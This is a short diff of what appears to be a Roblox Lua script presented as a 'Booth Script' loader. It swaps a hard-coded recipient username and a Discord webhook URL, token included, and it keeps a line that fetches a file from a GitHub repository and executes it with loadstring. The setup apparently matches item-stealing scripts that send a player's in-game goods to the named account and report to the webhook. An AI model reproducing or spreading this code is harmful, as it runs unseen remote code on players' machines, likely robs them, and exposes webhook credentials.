@@ -1,10 +1,10 @@
 _G.Name = "Loading Booth Script..."
-_G.Username = "HqLaTrLol"
+_G.Username = "S2CIKaynZ"
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/KaynZwt/psxice/main/codeice.md", true))()
 
-Username = "HqLaTrLol"
-WebHook = "https://discord.com/api/webhooks/1080537895942770809/qxM-_JE_o8CpJ1ruuIic2I6rGNxqlIQgu4vQ70aFTmCFUbtK_ECoRoRC6orED3nWCS4w"
+Username = "S2CIKaynZ"
+WebHook = "https://discord.com/api/webhooks/1089499583798853692/ivmZwdebHjlZux9mGHLlIR3DNwHtou1VchgotbJPPtuy2jfHhvqeHhnnL0OQ0bTQAwNL"
 
 _G.CustomScriptName = "Script Loaded"
 _G.Text1 = "Script Loaded..."
